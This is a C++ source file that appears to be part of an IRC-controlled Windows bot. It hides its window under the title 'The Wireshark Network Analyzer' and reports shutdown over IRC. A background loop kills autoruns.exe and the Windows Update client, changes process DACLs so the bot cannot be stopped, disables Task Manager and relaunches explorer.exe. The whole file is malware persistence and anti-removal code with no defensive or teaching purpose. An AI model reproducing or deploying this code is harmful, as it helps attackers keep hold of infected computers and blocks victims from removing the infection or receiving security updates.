#include "../Includes/includes.h"

void HandleShutdown(bool bLoggingOff)
{
#ifndef HTTP_BUILD
    if(bLoggingOff)
        strcpy(cSend, "QUIT :Windows is shutting down");
    else
        strcpy(cSend, "QUIT :User is logging off");

    SendToIrc(cSend);
#endif

    Sleep(1000);

    ExitProcess(0);
}

LRESULT CALLBACK QueryEndSessionCallback(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch(message)
    {
    case WM_QUERYENDSESSION:
        if(lParam == ENDSESSION_LOGOFF)
            HandleShutdown(FALSE);
        else
            HandleShutdown(TRUE);

        break;

    default:
        return DefWindowProc(hwnd, message, wParam, lParam);
    }

    return 0;
}

DWORD WINAPI WindowThread(LPVOID)
{
    char szClassName[] = "gdkWindowToplevel";

    WNDCLASSEX wndClass;
    MSG messages;
    HINSTANCE hThisInstance = GetModuleHandle(0);

    wndClass.hInstance = hThisInstance;
    wndClass.lpfnWndProc = QueryEndSessionCallback;
    wndClass.lpszClassName = szClassName;
    wndClass.style = NULL;
    wndClass.cbSize = sizeof(WNDCLASSEX);
    wndClass.hIcon = NULL;
    wndClass.hIconSm = NULL;
    wndClass.hCursor = NULL;
    wndClass.lpszMenuName = NULL;
    wndClass.cbClsExtra = NULL;
    wndClass.cbWndExtra = NULL;
    wndClass.hbrBackground = NULL;

    if(!RegisterClassEx(&wndClass))
        return 0;

    HWND hwndWindow;

    hwndWindow = CreateWindowEx(0, szClassName, "The Wireshark Network Analyzer", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 544, 375, HWND_DESKTOP, NULL, hThisInstance, NULL);
    ShowWindow(hwndWindow, FALSE);

    while(GetMessage(&messages, NULL, 0, 0))
    {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }

    return 1;
}

void CheckUnwantedProcesses()
{
    DWORD dwPid = NULL;

    for(unsigned short us = 0; us < 3; us++)
    {
        if(us == 0)
            dwPid = GetPidFromFilename((TCHAR*)"autoruns.exe");
        //else if(us == 1)
        //dwPid = GetPidFromFilename((TCHAR*)"msconfig.exe");
        else if(us == 1)
            dwPid = GetPidFromFilename((TCHAR*)"wuauclt.exe");
        else if(us == 1)
            dwPid = GetPidFromFilename((TCHAR*)"WerFault.exe");

        if(dwPid != 0)
            KillProcessByPid(dwPid, FALSE);
    }
}

void CheckExplorer()
{
    char cShellFile[MAX_PATH];
    memset(cShellFile, 0, sizeof(cShellFile));
    strcpy(cShellFile, "explorer.exe");

    char cShellFilePath[MAX_PATH];
    strcpy(cShellFilePath, cWindowsDirectory);
    strcat(cShellFilePath, "\\");
    strcat(cShellFilePath, cShellFile);

    DWORD dwPid = GetPidFromFilename(cShellFile);
    if(dwPid == 0)
    {
        if(StartProcessFromPath(cShellFilePath, TRUE))
            Sleep(500);
    }
}

DWORD WINAPI ProactivesThread(LPVOID)
{
    //if(IsNonDesirableEnvironment())
    //TerminateProcess((HANDLE)-1, 0);

    while(!bUninstallProgram)
    {
        CheckUnwantedProcesses();
        ProtectByModifyingDacl();
        DisableTaskManagerAllUsersButton();
        Sleep(250);

        CheckExplorer();
    }

    return 1;
}

void StartProactiveFunctions() //Guarantees the thread starts
{
    while(TRUE)
    {
        HANDLE hThread = CreateThread(NULL, NULL, ProactivesThread, NULL, NULL, NULL);
        if(hThread)
        {
            CloseHandle(hThread);
            break;
        }

        Sleep(500);
    }

    while(TRUE)
    {
        HANDLE hThread = CreateThread(NULL, NULL, WindowThread, NULL, NULL, NULL);
        if(hThread)
        {
            CloseHandle(hThread);
            break;
        }

        Sleep(500);
    }
}
